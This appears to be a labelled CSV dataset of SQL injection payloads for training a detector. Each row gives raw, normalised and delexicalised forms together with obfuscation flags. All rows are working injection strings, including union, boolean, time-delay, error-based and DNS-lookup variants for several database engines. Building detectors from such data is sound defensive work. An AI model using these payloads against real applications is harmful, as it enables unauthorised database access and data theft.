payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1%""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""%""  =  ""","1%"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  ""","select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = ""","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) and ( ( <STR> = """,1,False,,sqli_dataset
-8701%'   )    )    or   (  4843  =  1690  )  *1690 and    (    (   '%'  =  ',-8701%' ) ) or ( 4843 = 1690 ) *1690 and ( ( '%' = ',-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'crus'  =  'crus","1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'crus' = 'crus",<NUM><STR>crus<STR>crus,1,True,,sqli_dataset
"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt","1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",<NUM><STR>itpt<STR>itpt,1,False,,sqli_dataset
"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1"" ) as upjw where 3880 = 3880 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>"" ) as upjw where <NUM> = <NUM> and <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
"1""  )   where 3943  =  3943 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --","1"" ) where 3943 = 3943 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM>"" ) where <NUM> = <NUM> and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --",1,False,,sqli_dataset
-6777%'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  ',-6777%' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( '%' = ',-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1'  )   as uwmy where 6980  =  6980,1' ) as uwmy where 6980 = 6980,<NUM>' ) as uwmy where <NUM> = <NUM>,1,False,,sqli_dataset
"-4972'   )    )    as kfzc where 8817  =  8817 union all select 8817,8817,8817,8817,8817,8817--","-4972' ) ) as kfzc where 8817 = 8817 union all select 8817,8817,8817,8817,8817,8817--","-<NUM>' ) ) as kfzc where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"-2333' union all select 9714,9714,9714--","-2333' union all select 9714,9714,9714--","-<NUM>' union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'ujcx'  =  'ujcx","1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'ujcx' = 'ujcx",<NUM><STR>ujcx<STR>ujcx,1,False,,sqli_dataset
"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>"" and <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
"1""   )    )     )   union all select null,null--","1"" ) ) ) union all select null,null--","<NUM>"" ) ) ) union all select null,null--",1,False,,sqli_dataset
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""onsd"" like ""onsd","1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""onsd"" like ""onsd",<NUM><STR>onsd<STR>onsd,1,True,,sqli_dataset
"1   )    )    as rcon where 8190  =  8190 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1 ) ) as rcon where 8190 = 8190 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM> ) ) as rcon where <NUM> = <NUM> or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
"-2864'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'vjbl'  =  'vjbl","-2864' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'vjbl' = 'vjbl",-<NUM><STR>vjbl<STR>vjbl,1,True,,sqli_dataset
"1%""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  ""","1%"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,True,,sqli_dataset
-7497'  )   as kjzt where 3758  =  3758 or 4794  =  9499--,-7497' ) as kjzt where 3758 = 3758 or 4794 = 9499--,-<NUM>' ) as kjzt where <NUM> = <NUM> or <NUM> = <NUM>--,1,False,,sqli_dataset
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'mzqi'  =  'mzqi,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'mzqi' = 'mzqi,<NUM><STR>mzqi<STR>mzqi,1,False,,sqli_dataset
"-9247'   )    )     )   union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--","-9247' ) ) ) union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--","-<NUM>' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'eovg' like 'eovg","1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'eovg' like 'eovg",<NUM><STR>eovg<STR>eovg,1,True,,sqli_dataset
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   7749  =  7749","select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 7749 = 7749","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) and ( ( <NUM> = <NUM>",1,False,,sqli_dataset
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'nlky' like 'nlky","1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'nlky' like 'nlky",<NUM><STR>nlky<STR>nlky,1,False,,sqli_dataset
"-9904""   )    )    union all select 9080,9080,9080,9080,9080--","-9904"" ) ) union all select 9080,9080,9080,9080,9080--","-<NUM>"" ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
-4410 where 5749  =  5749 or 1317  =  9823--,-4410 where 5749 = 5749 or 1317 = 9823--,-<NUM> where <NUM> = <NUM> or <NUM> = <NUM>--,1,False,,sqli_dataset
"1   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1 ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM> ) ) or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )","1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )","<NUM> and row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x )",1,True,,sqli_dataset
"1' in boolean mode  )   union all select null,null,null,null,null,null#","1' in boolean mode ) union all select null,null,null,null,null,null#","<NUM>' in boolean mode ) union all select null,null,null,null,null,null#",1,False,,sqli_dataset
-9389'  )   order by 1#,-9389' ) order by 1#,-<NUM>' ) order by <NUM>#,1,False,,sqli_dataset
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'mmfq' = 'mmfq,<NUM><STR>mmfq<STR>mmfq,1,False,,sqli_dataset
-2749'  )   as fiho where 3531  =  3531 or 2777  =  1485#,-2749' ) as fiho where 3531 = 3531 or 2777 = 1485#,-<NUM>' ) as fiho where <NUM> = <NUM> or <NUM> = <NUM>#,1,False,,sqli_dataset
"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""egxe""  =  ""egxe","1"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""egxe"" = ""egxe",<NUM><STR>egxe<STR>egxe,1,False,,sqli_dataset
-6453%'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   '%'  =  ',-6453%' ) ) or ( 8459 = 8459 ) *4906 and ( ( '%' = ',-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""buzb""  =  ""buzb","1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""buzb"" = ""buzb",<NUM><STR>buzb<STR>buzb,1,False,,sqli_dataset
"1""   )    )     )   rlike   (  select   (  case when   (  7975  =  2446  )   then 1 else 0x28 end   )    )    and    (    (     (  ""qixm"" like ""qixm","1"" ) ) ) rlike ( select ( case when ( 7975 = 2446 ) then 1 else 0x28 end ) ) and ( ( ( ""qixm"" like ""qixm",<NUM><STR>qixm<STR>qixm,1,True,,sqli_dataset
-1300  )   as rrsm where 1086  =  1086 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,-1300 ) as rrsm where 1086 = 1086 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,-<NUM> ) as rrsm where <NUM> = <NUM> or <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) --,1,False,,sqli_dataset
1'||  (  select 'zxla' from dual where 7634  =  7634 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',<NUM><STR>zxla<STR>qqpjq<STR>qzvzq<STR>,1,False,,sqli_dataset
"1""  )   where 3390  =  3390","1"" ) where 3390 = 3390","<NUM>"" ) where <NUM> = <NUM>",1,False,,sqli_dataset
"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1' ) as sjmt where 6541 = 6541 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>' ) as sjmt where <NUM> = <NUM> or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw","select sleep ( 5 ) and ( ( ( ""lczw"" = ""lczw","select sleep ( <NUM> ) and ( ( ( <STR> = ""lczw",1,False,,sqli_dataset
1' in boolean mode  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   #,1' in boolean mode ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) #,<NUM>' in boolean mode ) and <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) #,1,False,,sqli_dataset
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  # ewsz,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) # ewsz,<NUM> rlike ( select * from ( select ( sleep ( <NUM> ) ) ) sgvo ) # ewsz,1,False,,sqli_dataset
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'fbzo' like 'fbzo,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'fbzo' like 'fbzo,<NUM><STR>fbzo<STR>fbzo,1,False,,sqli_dataset
"1'  )   union all select null,null,null,null,null,null,null,null,null,null--","1' ) union all select null,null,null,null,null,null,null,null,null,null--","<NUM>' ) union all select null,null,null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"-3270%' or elt  (  9404  =  3498,3498  )   and '%'  =  '","-3270%' or elt ( 9404 = 3498,3498 ) and '%' = '",-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq","1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""ygzq"" like ""ygzq",<NUM><STR>ygzq<STR>ygzq,1,True,,sqli_dataset
"-6534%'   )    )    or make_set  (  4107  =  9457,9457  )   and    (    (   '%'  =  '","-6534%' ) ) or make_set ( 4107 = 9457,9457 ) and ( ( '%' = '",-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1  )   as qodq where 4945  =  4945 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1 ) as qodq where 4945 = 4945 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM> ) as qodq where <NUM> = <NUM> or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,False,,sqli_dataset
"1'||  (  select 'uyfo' where 1236  =  1236 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'","1'|| ( select 'uyfo' where 1236 = 1236 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",<NUM><STR>uyfo<STR>,1,False,,sqli_dataset
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840","-2241 ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 6840 = 6840","-<NUM> ) ) ) or make_set ( <NUM> = <NUM>,<NUM> ) and ( ( ( <NUM> = <NUM>",1,False,,sqli_dataset
"1  )   where 8302  =  8302 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --","1 ) where 8302 = 8302 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --","<NUM> ) where <NUM> = <NUM> or <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --",1,False,,sqli_dataset
1%'   )    )     ),1%' ) ) ),<NUM>%' ) ) ),1,False,,sqli_dataset
"1   )    )    as mmby where 3990  =  3990 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --","1 ) ) as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM> ) ) as mmby where <NUM> = <NUM> and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --",1,False,,sqli_dataset
"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#","-4586' ) as shdb where 6176 = 6176 union all select 6176,6176,6176,6176#","-<NUM>' ) as shdb where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',1'+ ( select lqhd where 4251 = 4251 and ( 8754 = 5779 ) *5779 ) +',<NUM><STR>,1,True,,sqli_dataset
-2717'   )    )     )   or 8571  =  8571--,-2717' ) ) ) or 8571 = 8571--,-<NUM>' ) ) ) or <NUM> = <NUM>--,1,False,,sqli_dataset
"1   )    )    union all select null,null,null,null,null--","1 ) ) union all select null,null,null,null,null--","<NUM> ) ) union all select null,null,null,null,null--",1,False,,sqli_dataset
"1%""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""%""  =  ""","1%"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1%'  ),1%' ),<NUM>%' ),1,False,,sqli_dataset
"-5698'   )    )    as egjr where 5586  =  5586 union all select 5586,5586,5586--","-5698' ) ) as egjr where 5586 = 5586 union all select 5586,5586,5586--","-<NUM>' ) ) as egjr where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )","1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )","<NUM>' and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null )",1,False,,sqli_dataset
1'||  (  select 'sbip' from dual where 7302  =  7302 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',1'|| ( select 'sbip' from dual where 7302 = 7302 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) ||',<NUM><STR>sbip<STR>,1,False,,sqli_dataset
1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,1'|| ( select 'bwqc' from dual where 6897 = 6897 and sleep ( 5 ) #,<NUM><STR>bwqc' from dual where <NUM> = <NUM> and sleep ( <NUM> ) #,1,False,,sqli_dataset
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,1' ) ) as hzbj where 1725 = 1725 or sleep ( 5 ) #,<NUM>' ) ) as hzbj where <NUM> = <NUM> or sleep ( <NUM> ) #,1,False,,sqli_dataset
"-2979'   )    )    as klou where 7092  =  7092 union all select 7092,7092--","-2979' ) ) as klou where 7092 = 7092 union all select 7092,7092--","-<NUM>' ) ) as klou where <NUM> = <NUM> union all select <NUM>,<NUM>--",1,False,,sqli_dataset
"1'  )   union all select null,null#","1' ) union all select null,null#","<NUM>' ) union all select null,null#",1,False,,sqli_dataset
"1  )   where 5336  =  5336 union all select null,null,null,null,null,null,null,null,null,null#","1 ) where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#","<NUM> ) where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
